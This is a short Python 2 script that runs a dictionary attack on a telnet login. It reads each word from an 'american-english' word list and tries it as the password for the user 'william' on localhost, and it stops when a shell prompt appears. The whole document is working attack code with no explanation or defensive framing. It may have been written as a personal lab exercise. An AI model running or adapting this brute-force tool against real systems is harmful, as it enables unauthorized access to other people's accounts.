#!/usr/bin/python
import os
import sys
import telnetlib

HOSTNAME = "localhost"
USERNAME = "william"
CONNECT_TIMEOUT = 2
AUTH_TIMEOUT = 10

def ReadUntil(tn, expected, log_message, timeout):
	output = tn.read_until(expected, timeout)
	print "\t\t\"" + output.replace("\n", "\n\t\t") + "\""
	#print log_message + ": '" + output + "' //END " + log_message
	return output.rfind(expected) != -1

def AttemptLogin(password):
	while True:
		tn = telnetlib.Telnet(HOSTNAME)
		
		if not ReadUntil(tn, "login: ", "Login prompt", CONNECT_TIMEOUT):
			# TODO: PRINT TIMEOUT
			print "Timeout"
			tn.close()
			continue
		print "*\tUsername '" + USERNAME + "'"
		tn.write(USERNAME + "\r\n")
		
		if not ReadUntil(tn, "Password: ", "Password prompt", CONNECT_TIMEOUT):
			# TODO: PRINT TIMEOUT
			print "Timeout"
			tn.close()
			continue
	
		print "\tPassword '" + password + "'..."	
		tn.write(password + "\r\n")
		
		result = ReadUntil(tn, "$ ", "Login check!", AUTH_TIMEOUT)
		print result and "GREAT SUCCESS" or "MISERABLE FAILURE"
		
		tn.close()
		
		return result



f = open("american-english", "r")
done = False
line = ""

while not done:
	line = f.readline()
	done = AttemptLogin(line.strip())

